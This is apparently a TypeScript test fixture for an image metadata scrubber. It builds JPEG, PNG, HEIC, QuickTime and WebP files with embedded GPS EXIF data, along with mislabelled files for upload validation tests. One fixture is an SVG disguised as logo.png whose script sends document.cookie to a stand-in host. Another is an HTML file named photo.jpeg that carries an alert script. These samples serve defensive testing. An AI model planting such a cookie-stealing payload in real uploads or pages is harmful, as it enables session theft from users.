/**
 * Files that carry the thing the library is supposed to remove.
 *
 * The photographs are real: the JPEG and the PNG are files that ship in this
 * repository, and the fixture puts a genuine EXIF block — with a GPS IFD
 * holding real coordinates — into them, exactly the way a phone does. That
 * matters, because a scrubber tested only against a file the test itself
 * invented proves nothing about a photo off an iPhone.
 *
 * The HEIC and QuickTime fixtures are constructed, because there is no such
 * file in the tree to borrow. They are structurally real — a `meta` box with
 * `iinf`/`iloc` item records pointing into `mdat` for the HEIC, a `moov` with
 * `mvhd` and a `udta` holding the `©xyz` location atom for the QuickTime — which
 * is all the scrubber reads.
 */

import { readFileSync } from "node:fs";
import path from "node:path";

export const REPO = process.cwd();

/** Auckland's Queen Street, near enough. S 36 50 54.6, E 174 45 47.9. */
export const FIXTURE_LATITUDE = [36, 50, 54.6] as const;
export const FIXTURE_LONGITUDE = [174, 45, 47.9] as const;
export const FIXTURE_TAKEN = "2026:09:14 10:31:08";

export function repoFile(relative: string): Uint8Array {
  return new Uint8Array(readFileSync(path.join(REPO, relative)));
}

// ---------------------------------------------------------------------------
// A real EXIF block, little-endian, with a GPS IFD and a DateTimeOriginal
// ---------------------------------------------------------------------------

export function exifWithGps(): Uint8Array {
  const tiff = new Uint8Array(160);
  const view = new DataView(tiff.buffer);
  const putAscii = (offset: number, text: string, length: number): void => {
    for (let index = 0; index < length; index += 1) {
      tiff[offset + index] = index < text.length ? text.charCodeAt(index) : 0;
    }
  };
  const rational = (
    offset: number,
    numerator: number,
    denominator: number,
  ): void => {
    view.setUint32(offset, numerator, true);
    view.setUint32(offset + 4, denominator, true);
  };

  putAscii(0, "II", 2);
  view.setUint16(2, 42, true);
  view.setUint32(4, 8, true);

  // IFD0 at 8: DateTime, and the pointer to the GPS IFD.
  view.setUint16(8, 2, true);
  entry(view, 10, 0x0132, 2, 20, 92);
  entry(view, 22, 0x8825, 4, 1, 38);
  view.setUint32(34, 0, true);

  // GPS IFD at 38.
  view.setUint16(38, 4, true);
  entry(view, 40, 0x0001, 2, 2, 0);
  putAscii(48, "S", 2); // inline value, in the value field of that entry
  entry(view, 52, 0x0002, 5, 3, 112);
  entry(view, 64, 0x0003, 2, 2, 0);
  putAscii(72, "E", 2);
  entry(view, 76, 0x0004, 5, 3, 136);
  view.setUint32(88, 0, true);

  putAscii(92, FIXTURE_TAKEN, 20);

  rational(112, FIXTURE_LATITUDE[0], 1);
  rational(120, FIXTURE_LATITUDE[1], 1);
  rational(128, Math.round(FIXTURE_LATITUDE[2] * 10), 10);
  rational(136, FIXTURE_LONGITUDE[0], 1);
  rational(144, FIXTURE_LONGITUDE[1], 1);
  rational(152, Math.round(FIXTURE_LONGITUDE[2] * 10), 10);

  return tiff;
}

function entry(
  view: DataView,
  at: number,
  tag: number,
  type: number,
  count: number,
  value: number,
): void {
  view.setUint16(at, tag, true);
  view.setUint16(at + 2, type, true);
  view.setUint32(at + 4, count, true);
  view.setUint32(at + 8, value, true);
}

// ---------------------------------------------------------------------------
// JPEG
// ---------------------------------------------------------------------------

/** A real photo from the repository, with a real EXIF/GPS block put back in. */
export function jpegWithGps(
  source = "public/media/bottles/no-01-house.jpg",
): Uint8Array {
  const original = repoFile(source);
  const tiff = exifWithGps();
  const payloadLength = 2 + 6 + tiff.length;
  const segment = new Uint8Array(2 + payloadLength);
  segment[0] = 0xff;
  segment[1] = 0xe1;
  segment[2] = (payloadLength >> 8) & 0xff;
  segment[3] = payloadLength & 0xff;
  segment.set([0x45, 0x78, 0x69, 0x66, 0x00, 0x00], 4); // "Exif\0\0"
  segment.set(tiff, 10);

  const out = new Uint8Array(original.length + segment.length);
  out.set(original.subarray(0, 2), 0);
  out.set(segment, 2);
  out.set(original.subarray(2), 2 + segment.length);
  return out;
}

// ---------------------------------------------------------------------------
// PNG
// ---------------------------------------------------------------------------

const CRC_TABLE = (() => {
  const table = new Uint32Array(256);
  for (let index = 0; index < 256; index += 1) {
    let value = index;
    for (let bit = 0; bit < 8; bit += 1) {
      value = value & 1 ? 0xedb88320 ^ (value >>> 1) : value >>> 1;
    }
    table[index] = value >>> 0;
  }
  return table;
})();

function crc32(bytes: Uint8Array): number {
  let crc = 0xffffffff;
  for (const byte of bytes) {
    crc = (CRC_TABLE[(crc ^ byte) & 0xff] ?? 0) ^ (crc >>> 8);
  }
  return (crc ^ 0xffffffff) >>> 0;
}

function pngChunk(type: string, data: Uint8Array): Uint8Array {
  const out = new Uint8Array(12 + data.length);
  const view = new DataView(out.buffer);
  view.setUint32(0, data.length);
  for (let index = 0; index < 4; index += 1) {
    out[4 + index] = type.charCodeAt(index);
  }
  out.set(data, 8);
  view.setUint32(8 + data.length, crc32(out.subarray(4, 8 + data.length)));
  return out;
}

/** A real PNG with an eXIf chunk and a tEXt comment added after IHDR. */
export function pngWithExif(
  source = "public/3d/fallback/bottle-hero.png",
): Uint8Array {
  const original = repoFile(source);
  const ihdrEnd = 8 + 25; // signature + IHDR (length 13 + 12 overhead)
  const inserted = [
    pngChunk("eXIf", exifWithGps()),
    pngChunk(
      "tEXt",
      new TextEncoder().encode("Comment\u0000shot at home, GPSLatitude -36.85"),
    ),
  ];
  const size = inserted.reduce((sum, chunk) => sum + chunk.length, 0);
  const out = new Uint8Array(original.length + size);
  out.set(original.subarray(0, ihdrEnd), 0);
  let offset = ihdrEnd;
  for (const chunk of inserted) {
    out.set(chunk, offset);
    offset += chunk.length;
  }
  out.set(original.subarray(ihdrEnd), offset);
  return out;
}

// ---------------------------------------------------------------------------
// ISO base media: HEIC and QuickTime
// ---------------------------------------------------------------------------

function box(type: string, ...parts: readonly Uint8Array[]): Uint8Array {
  const body = parts.reduce((sum, part) => sum + part.length, 0);
  const out = new Uint8Array(8 + body);
  new DataView(out.buffer).setUint32(0, out.length);
  for (let index = 0; index < 4; index += 1) {
    out[4 + index] = type.charCodeAt(index);
  }
  let offset = 8;
  for (const part of parts) {
    out.set(part, offset);
    offset += part.length;
  }
  return out;
}

function u8(...values: readonly number[]): Uint8Array {
  return new Uint8Array(values);
}

function u16(value: number): Uint8Array {
  const out = new Uint8Array(2);
  new DataView(out.buffer).setUint16(0, value);
  return out;
}

function u32(value: number): Uint8Array {
  const out = new Uint8Array(4);
  new DataView(out.buffer).setUint32(0, value);
  return out;
}

function fourcc(text: string): Uint8Array {
  return new Uint8Array([...text].map((character) => character.charCodeAt(0)));
}

/**
 * A HEIC whose `Exif` item holds a GPS block, laid out the way a phone lays one
 * out: the item's bytes live in `mdat`, and `iloc` records where.
 */
export function heicWithGps(): {
  readonly bytes: Uint8Array;
  readonly exifStart: number;
  readonly exifLength: number;
} {
  const tiff = exifWithGps();
  // An Exif item begins with a four-byte offset to the TIFF header.
  const exifItem = new Uint8Array(4 + tiff.length);
  exifItem.set(u32(0), 0);
  exifItem.set(tiff, 4);
  const picture = new Uint8Array(64).fill(0x5a);

  const ftyp = box(
    "ftyp",
    fourcc("heic"),
    u32(0),
    fourcc("heic"),
    fourcc("mif1"),
  );

  const infePicture = box(
    "infe",
    u8(2, 0, 0, 0),
    u16(1),
    u16(0),
    fourcc("hvc1"),
    u8(0),
  );
  const infeExif = box(
    "infe",
    u8(2, 0, 0, 0),
    u16(2),
    u16(0),
    fourcc("Exif"),
    u8(0),
  );
  const iinf = box("iinf", u8(0, 0, 0, 0), u16(2), infePicture, infeExif);

  // Offsets into the file are only known once the header is sized, so the boxes
  // are built twice: once to measure, once with the real offsets.
  const build = (pictureAt: number, exifAt: number): Uint8Array => {
    const iloc = box(
      "iloc",
      u8(0, 0, 0, 0),
      u8(0x44), // offset_size 4, length_size 4
      u8(0x00), // base_offset_size 0
      u16(2),
      u16(1),
      u16(0),
      u16(1),
      u32(pictureAt),
      u32(picture.length),
      u16(2),
      u16(0),
      u16(1),
      u32(exifAt),
      u32(exifItem.length),
    );
    const hdlr = box(
      "hdlr",
      u8(0, 0, 0, 0),
      u32(0),
      fourcc("pict"),
      new Uint8Array(13),
    );
    const ispe = box("ispe", u8(0, 0, 0, 0), u32(1200), u32(1600));
    const ipco = box("ipco", ispe);
    const iprp = box("iprp", ipco);
    const meta = box("meta", u8(0, 0, 0, 0), hdlr, iinf, iloc, iprp);
    const mdat = box("mdat", picture, exifItem);
    const out = new Uint8Array(ftyp.length + meta.length + mdat.length);
    out.set(ftyp, 0);
    out.set(meta, ftyp.length);
    out.set(mdat, ftyp.length + meta.length);
    return out;
  };

  const measured = build(0, 0);
  const mdatStart = measured.length - (8 + picture.length + exifItem.length);
  const pictureAt = mdatStart + 8;
  const exifAt = pictureAt + picture.length;
  return {
    bytes: build(pictureAt, exifAt),
    exifStart: exifAt,
    exifLength: exifItem.length,
  };
}

/** A QuickTime movie with the `©xyz` location atom an iPhone writes. */
export function quicktimeWithLocation(): Uint8Array {
  const ftyp = box("ftyp", fourcc("qt  "), u32(0x20050300), fourcc("qt  "));
  const location = "+36.8485-174.7633+025.000/";
  const xyz = box(
    "©xyz",
    u16(location.length),
    u16(0x15c4),
    new TextEncoder().encode(location),
  );
  const udta = box("udta", xyz);
  const mvhd = box(
    "mvhd",
    u8(0, 0, 0, 0),
    u32(0),
    u32(0),
    u32(600), // timescale
    u32(3600), // duration: six seconds
    u32(0x00010000),
    u16(0x0100),
    new Uint8Array(70),
  );
  const moov = box("moov", mvhd, udta);
  const mdat = box("mdat", new Uint8Array(128).fill(0x11));
  const out = new Uint8Array(ftyp.length + moov.length + mdat.length);
  out.set(ftyp, 0);
  out.set(moov, ftyp.length);
  out.set(mdat, ftyp.length + moov.length);
  return out;
}

/** A WebP whose RIFF carries EXIF and XMP chunks, with the VP8X flags set. */
export function webpWithExif(): Uint8Array {
  const tiff = exifWithGps();
  const vp8x = riffChunk(
    "VP8X",
    new Uint8Array([
      0x0c, // EXIF (0x08) and XMP (0x04) present
      0,
      0,
      0,
      99,
      0,
      0, // canvas width - 1 = 99
      199,
      0,
      0, // canvas height - 1 = 199
    ]),
  );
  const vp8 = riffChunk(
    "VP8 ",
    new Uint8Array([
      0x30, 0x01, 0x00, 0x9d, 0x01, 0x2a, 0x64, 0x00, 0xc8, 0x00, 0x00, 0x00,
    ]),
  );
  const exif = riffChunk("EXIF", tiff);
  const xmp = riffChunk(
    "XMP ",
    new TextEncoder().encode(
      "<x:xmpmeta><exif:GPSLatitude>-36,50.91S</exif:GPSLatitude></x:xmpmeta>",
    ),
  );
  const body = concat([vp8x, vp8, exif, xmp]);
  const out = new Uint8Array(12 + body.length);
  out.set(fourcc("RIFF"), 0);
  new DataView(out.buffer).setUint32(4, body.length + 4, true);
  out.set(fourcc("WEBP"), 8);
  out.set(body, 12);
  return out;
}

function riffChunk(type: string, data: Uint8Array): Uint8Array {
  const padded = data.length + (data.length % 2);
  const out = new Uint8Array(8 + padded);
  out.set(fourcc(type), 0);
  new DataView(out.buffer).setUint32(4, data.length, true);
  out.set(data, 8);
  return out;
}

function concat(parts: readonly Uint8Array[]): Uint8Array {
  const out = new Uint8Array(parts.reduce((sum, part) => sum + part.length, 0));
  let offset = 0;
  for (const part of parts) {
    out.set(part, offset);
    offset += part.length;
  }
  return out;
}

// ---------------------------------------------------------------------------
// Files that are not what they say they are
// ---------------------------------------------------------------------------

/** A PNG called `holiday.jpg` — the plain mislabelled case. */
export function pngNamedJpg(): { bytes: Uint8Array; filename: string } {
  return {
    bytes: repoFile("public/3d/fallback/bottle-hero.png"),
    filename: "holiday.jpg",
  };
}

/** An SVG with a script in it, called `logo.png`. */
export function scriptedSvgNamedPng(): { bytes: Uint8Array; filename: string } {
  const svg =
    '<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">' +
    '<script>fetch("https://example.invalid/?c="+document.cookie)</script></svg>';
  return { bytes: new TextEncoder().encode(svg), filename: "logo.png" };
}

/** An HTML page with a `.jpeg` extension and an image content type. */
export function htmlNamedJpeg(): { bytes: Uint8Array; filename: string } {
  const html =
    "<!DOCTYPE html><html><body><script>alert(1)</script></body></html>";
  return { bytes: new TextEncoder().encode(html), filename: "photo.jpeg" };
}
